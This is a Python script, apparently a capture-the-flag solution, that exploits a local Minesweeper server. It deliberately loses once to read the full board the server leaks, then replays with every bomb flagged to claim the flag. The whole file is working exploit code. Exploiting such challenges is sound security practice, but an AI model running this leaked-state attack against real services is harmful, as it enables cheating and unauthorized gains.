#!/usr/bin/env python3

import time
from modules.client import Client
from modules.marker import Marker

HOST = "127.0.0.1"
PORT = 9999

def print_board(board, dim, title="Board"):
    print(f"\n{title}:")
    print("   " + " ".join(str(i).rjust(2) for i in range(dim)))
    print("  +" + "--" * dim + "+")
    for r in range(dim):
        print(str(r).rjust(2) + "|", end=" ")
        for c in range(dim):
            cell = board[r][c]
            if cell == Marker.COVERED:
                print("■", end=" ")
            elif cell == Marker.FLAG:
                print("⚑", end=" ")
            elif cell == Marker.BOMB:
                print("💣", end=" ")
            elif cell == Marker.EMPTY:
                print(" ", end=" ")
            elif isinstance(cell, int) and 1 <= cell <= 8:
                print(str(cell), end=" ")
            else:
                print("?", end=" ")
        print("|")
    print("  +" + "--" * dim + "+")

def exploit():
    USERNAME   = "user"
    PASSWORD   = "user"
    BOARD_NAME = "name"
    SECRET     = "secret"
    SEED       = 0          # 0 = seed casuale lato server
    DIM        = 2
    BOMBS      = 1

    client = Client(HOST, PORT)
    client.signup(USERNAME, PASSWORD)
    ok, msg = client.login(USERNAME, PASSWORD)
    if not ok:
        raise SystemExit(f"Login fallita: {msg}")

    # Tentativo di load; se non esiste, creala
    ok, msg = client.load_board(BOARD_NAME)
    if not ok and "does not exist" in msg:
        ok, msg = client.create_board(BOARD_NAME, SECRET, SEED, DIM, BOMBS)
        if not ok:
            raise SystemExit(f"Creazione board fallita: {msg}")
        ok, msg = client.load_board(BOARD_NAME)
    if not ok:
        raise SystemExit(f"load_board fallita: {msg}")


    ok, play_msg = client.play()
    if not ok:
        raise SystemExit(f"play fallita: {play_msg}")
    game_seed, dim, num_bombs = play_msg

    # Ricava bombe
    bomb_positions = []
    board_state = [[Marker.COVERED]*dim for _ in range(dim)]
    for r in range(dim):
        for c in range(dim):
            ok, reply = client.uncover(r, c)
            if not ok or reply[0] == -1:
                _, full = reply # Quando scopre la bomba il server ritorna (-1, full_board); full_board contiene lo stato completo in chiaro, quindi anche la posizione delle bombe
                bomb_positions = [(i, j) for i in range(dim) for j in range(dim)
                                  if full[i][j] == Marker.BOMB]
                print_board(full, dim, "BOARD COMPLETA SCOPERTA")
                break
            else:
                board_state[r][c] = reply[0]
        if bomb_positions:
            break

    if not bomb_positions:
        raise SystemExit("Nessuna bomba trovata!")

    # Sincronizza nuovo play
    client.load_board(BOARD_NAME)
    client.play()

    # Prepara per check_win
    for (r, c) in bomb_positions:
        board_state[r][c] = Marker.FLAG

    print_board(board_state, dim, "BOARD FINALE")
    ok, flag = client.check_win(board_state)
    if ok:
        print(f"\n🎉 VITTORIA! Flag: {flag} 🎉")
    else:
        print(f"\n❌ Errore: {flag}")

    client.quit()

if __name__ == "__main__":
    exploit()